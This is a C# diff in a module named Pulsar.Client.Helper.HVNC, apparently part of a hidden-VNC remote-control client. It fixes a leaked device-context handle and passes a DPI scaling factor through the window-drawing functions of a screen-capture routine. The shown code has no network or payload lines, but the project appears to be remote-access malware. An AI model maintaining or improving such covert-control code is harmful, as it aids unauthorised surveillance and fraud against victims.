@@ -81,16 +81,16 @@ namespace Pulsar.Client.Helper.HVNC
                 IntPtr hdc = graphics.GetHdc();
                 int deviceCaps = GetDeviceCaps(hdc, 10);
                 result = (float)GetDeviceCaps(hdc, 117) / (float)deviceCaps;
+                graphics.ReleaseHdc(hdc);
             }
             return result;
         }
 
-        private bool DrawApplication(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
+        private bool DrawApplication(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC, float scalingFactor)
         {
             bool result = false;
             RECT rect;
             GetWindowRect(hWnd, out rect);
-            float scalingFactor = GetScalingFactor();
             IntPtr intPtr = CreateCompatibleDC(DC);
             IntPtr intPtr2 = CreateCompatibleBitmap(DC, (int)((float)(rect.Right - rect.Left) * scalingFactor), (int)((float)(rect.Bottom - rect.Top) * scalingFactor));
             SelectObject(intPtr, intPtr2);
@@ -113,7 +113,7 @@ namespace Pulsar.Client.Helper.HVNC
             return result;
         }
 
-        private void DrawTopDown(IntPtr owner, Graphics ModifiableScreen, IntPtr DC)
+        private void DrawTopDown(IntPtr owner, Graphics ModifiableScreen, IntPtr DC, float scalingFactor)
         {
             IntPtr intPtr = GetTopWindow(owner);
             if (intPtr == IntPtr.Zero)
@@ -127,19 +127,19 @@ namespace Pulsar.Client.Helper.HVNC
             }
             while (intPtr != IntPtr.Zero)
             {
-                this.DrawHwnd(intPtr, ModifiableScreen, DC);
+                this.DrawHwnd(intPtr, ModifiableScreen, DC, scalingFactor);
                 intPtr = GetWindow(intPtr, GetWindowType.GW_HWNDPREV);
             }
         }
 
-        private void DrawHwnd(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
+        private void DrawHwnd(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC, float scalingFactor)
         {
             if (IsWindowVisible(hWnd))
             {
-                this.DrawApplication(hWnd, ModifiableScreen, DC);
+                this.DrawApplication(hWnd, ModifiableScreen, DC, scalingFactor);
                 if (Environment.OSVersion.Version.Major < 6)
                 {
-                    this.DrawTopDown(hWnd, ModifiableScreen, DC);
+                    this.DrawTopDown(hWnd, ModifiableScreen, DC, scalingFactor);
                 }
             }
         }
@@ -158,10 +158,17 @@ namespace Pulsar.Client.Helper.HVNC
             GetWindowRect(GetDesktopWindow(), out rect);
             float scalingFactor = GetScalingFactor();
             Bitmap bitmap = new Bitmap((int)((float)rect.Right * scalingFactor), (int)((float)rect.Bottom * scalingFactor));
-            Graphics graphics = Graphics.FromImage(bitmap);
-            this.DrawTopDown(IntPtr.Zero, graphics, dc);
-            graphics.Dispose();
-            ReleaseDC(IntPtr.Zero, dc);
+            try
+            {
+                using (Graphics graphics = Graphics.FromImage(bitmap))
+                {
+                    this.DrawTopDown(IntPtr.Zero, graphics, dc, scalingFactor);
+                }
+            }
+            finally
+            {
+                ReleaseDC(IntPtr.Zero, dc);
+            }
             return bitmap;
         }
 
